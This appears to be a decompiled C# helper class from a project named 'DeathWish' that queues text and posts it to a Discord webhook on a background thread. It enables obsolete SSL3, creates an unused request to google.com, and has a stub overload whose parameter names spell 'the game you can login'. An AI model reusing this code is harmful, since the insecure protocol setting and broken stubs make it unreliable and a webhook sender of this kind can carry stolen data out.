using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Threading;

namespace DeathWish
{
	public class Discord
	{
		private string API = "";

		private Queue<string> Msgs;

		private Uri webhook;

		public Discord(string API)
		{
			this.API = API;
			Msgs = new Queue<string>();
			webhook = new Uri(API);
			Thread thread = new Thread(Dequeue);
			thread.Start();
		}

		private void Dequeue()
		{
			while (true)
			{
				try
				{
					while (Msgs.Count != 0)
					{
						string text = Msgs.Dequeue();
						postToDiscord(text);
					}
					Thread.Sleep(1000);
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}

		public void Enqueue(string str)
		{
			Msgs.Enqueue(str ?? "");
		}

		private void postToDiscord(string Text)
		{
			HttpClient httpClient = new HttpClient();
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			dictionary.Add("content", Text);
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://google.com/api/");
			FormUrlEncodedContent content = new FormUrlEncodedContent(dictionary);
			HttpResponseMessage result = httpClient.PostAsync(webhook, content).Result;
			if (!result.IsSuccessStatusCode)
			{
			}
		}

		internal void Enqueue(string v1, object the, object game, bool v2, object you, object can, object login, object p)
		{
			throw new NotImplementedException();
		}
	}
}
